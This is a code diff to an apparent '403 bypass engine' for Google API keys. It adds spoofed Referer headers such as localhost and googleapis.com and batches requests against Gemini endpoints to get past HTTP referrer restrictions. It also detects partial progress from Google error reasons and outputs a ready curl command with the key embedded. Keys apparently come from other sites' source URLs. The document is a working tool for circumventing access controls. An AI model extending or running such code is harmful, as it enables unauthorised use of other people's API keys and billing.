@@ -1,4 +1,4 @@
-"""403 Bypass engine with auto-registered strategy pattern."""
+"""403 bypass engine with probe-based batches and legacy strategy classes."""
 
 import asyncio
 import json
@@ -378,7 +378,7 @@ class StreamEndpoint(BypassStrategy):
         return [
             BypassAttempt(
                 technique_name=f"{self.name}:{ver}",
-                endpoint=f"models/gemini-2.0-flash:streamGenerateContent",
+                endpoint="models/gemini-2.0-flash:streamGenerateContent",
                 method="POST",
                 body=body,
                 headers={"Content-Type": "application/json"},
@@ -512,6 +512,17 @@ GOOGLE_WEB_ORIGINS = [
     "https://makersuite.google.com",
     "https://www.google.com",
 ]
+COMMON_REFERERS = [
+    "127.0.0.1",
+    "localhost",
+    "http://127.0.0.1",
+    "http://127.0.0.1/",
+    "http://localhost",
+    "http://localhost:3000",
+    "http://localhost:8080",
+    "https://googleapis.com",
+    "https://example.com",
+]
 PRIORITY_MODELS = [
     "gemini-2.0-flash",
     "gemini-2.0-flash-lite",
@@ -551,6 +562,26 @@ def _dedupe_keep_order(values: list[str]) -> list[str]:
             seen.add(value)
             out.append(value)
     return out
+
+
+def google_error_reason(resp: httpx.Response) -> str | None:
+    """Extract Google RPC ErrorInfo.reason from an error response."""
+    try:
+        payload = resp.json()
+    except ValueError:
+        return None
+
+    details = payload.get("error", {}).get("details", [])
+    if not isinstance(details, list):
+        return None
+
+    for detail in details:
+        if not isinstance(detail, dict):
+            continue
+        reason = detail.get("reason")
+        if isinstance(reason, str):
+            return reason
+    return None
 
 
 def _build_browser_headers(
@@ -596,7 +627,7 @@ def _embed_body() -> str:
 
 
 class BypassEngine:
-    """Runs all registered strategies against a 403'd key."""
+    """Runs probe-based bypass batches against a 403'd key."""
 
     def __init__(self, strategies: list[BypassStrategy] | None = None):
         if strategies is None:
@@ -792,6 +823,27 @@ class BypassEngine:
             )
         return self._dedupe_attempts(attempts)
 
+    def _common_referrer_attempts(self, key_in_header: bool) -> list[BypassAttempt]:
+        attempts: list[BypassAttempt] = []
+        for referer in COMMON_REFERERS:
+            headers = {"Referer": referer}
+            attempts.append(
+                self._attempt(
+                    f"common-referer:models:{referer}",
+                    headers=headers,
+                    key_in_header=key_in_header,
+                )
+            )
+            attempts.append(
+                self._attempt(
+                    f"common-referer:files:{referer}",
+                    headers=headers,
+                    endpoint="files",
+                    key_in_header=key_in_header,
+                )
+            )
+        return self._dedupe_attempts(attempts)
+
     def _host_override_attempts(
         self,
         domains: list[str],
@@ -936,6 +988,7 @@ class BypassEngine:
 
         for idx, prefer_header in enumerate(auth_modes):
             key_in_header = prefer_header
+            batches.append(self._common_referrer_attempts(key_in_header))
             batches.append(
                 self._contextual_referrer_attempts(
                     domains,
@@ -965,13 +1018,43 @@ class BypassEngine:
         session: SessionManager,
         concurrency: int,
         time_budget: float,
+        initial_reason: str | None = None,
     ) -> tuple[BypassDetail | None, dict[str, int]]:
         if time_budget <= 0:
             return None, {}
         sem = asyncio.Semaphore(concurrency)
         found: asyncio.Event = asyncio.Event()
         winner: list[tuple[BypassAttempt, int]] = []
+        permission_progress: list[tuple[BypassAttempt, int, str]] = []
         statuses: dict[str, int] = {}
+
+        def render_detail(
+            attempt: BypassAttempt,
+            status_code: int,
+            error_reason: str | None = None,
+        ) -> BypassDetail:
+            detail = attempt.to_bypass_detail()
+            rendered = BypassAttempt(
+                technique_name=attempt.technique_name,
+                headers={
+                    **{
+                        k: v
+                        for k, v in attempt.headers.items()
+                        if k.lower() != "x-goog-api-key"
+                    },
+                    **({"x-goog-api-key": key} if attempt.key_in_header else {}),
+                },
+                api_version=attempt.api_version,
+                endpoint=attempt.endpoint,
+                method=attempt.method,
+                body=attempt.body,
+                key_in_header=attempt.key_in_header,
+            )
+            detail.headers = rendered.headers
+            detail.curl_command = rendered.to_curl(key)
+            detail.bypass_status_code = status_code
+            detail.error_reason = error_reason
+            return detail
 
         async def try_attempt(attempt: BypassAttempt) -> None:
             if found.is_set():
@@ -1000,6 +1083,14 @@ class BypassEngine:
                     if resp.status_code in (200, 429):
                         winner.append((attempt, resp.status_code))
                         found.set()
+                    elif (
+                        resp.status_code == 403
+                        and initial_reason == "API_KEY_HTTP_REFERRER_BLOCKED"
+                        and google_error_reason(resp) == "SERVICE_DISABLED"
+                    ):
+                        permission_progress.append(
+                            (attempt, resp.status_code, "SERVICE_DISABLED")
+                        )
                 except (httpx.HTTPError, Exception):
                     pass
 
@@ -1021,23 +1112,11 @@ class BypassEngine:
 
         if winner:
             attempt, status_code = winner[0]
-            detail = attempt.to_bypass_detail()
-            rendered = BypassAttempt(
-                technique_name=attempt.technique_name,
-                headers={
-                    **{k: v for k, v in attempt.headers.items() if k.lower() != "x-goog-api-key"},
-                    **({"x-goog-api-key": key} if attempt.key_in_header else {}),
-                },
-                api_version=attempt.api_version,
-                endpoint=attempt.endpoint,
-                method=attempt.method,
-                body=attempt.body,
-                key_in_header=attempt.key_in_header,
-            )
-            detail.headers = rendered.headers
-            detail.curl_command = rendered.to_curl(key)
-            detail.bypass_status_code = status_code
-            return detail, statuses
+            return render_detail(attempt, status_code), statuses
+
+        if permission_progress:
+            attempt, status_code, reason = permission_progress[0]
+            return render_detail(attempt, status_code, reason), statuses
 
         return None, statuses
 
@@ -1050,8 +1129,9 @@ class BypassEngine:
         source_urls: list[str] | None = None,
         target_domains: list[str] | None = None,
         concurrency: int = 10,
+        initial_reason: str | None = None,
     ) -> BypassDetail | None:
-        """Run probe-based, deduplicated bypass batches and stop on first success."""
+        """Run probe-based bypass batches and stop on first useful result."""
         domains = self._candidate_domains(target_domain, target_domains, source_urls)
         origins, referers = self._candidate_contexts(domains, source_urls)
         started = asyncio.get_running_loop().time()
@@ -1067,6 +1147,7 @@ class BypassEngine:
             session,
             concurrency=min(concurrency, 4),
             time_budget=min(remaining_budget(), 1.8),
+            initial_reason=initial_reason,
         )
         if probe_winner:
             return probe_winner
@@ -1082,6 +1163,7 @@ class BypassEngine:
                 session,
                 concurrency=min(concurrency, 6),
                 time_budget=budget,
+                initial_reason=initial_reason,
             )
             if winner:
                 return winner
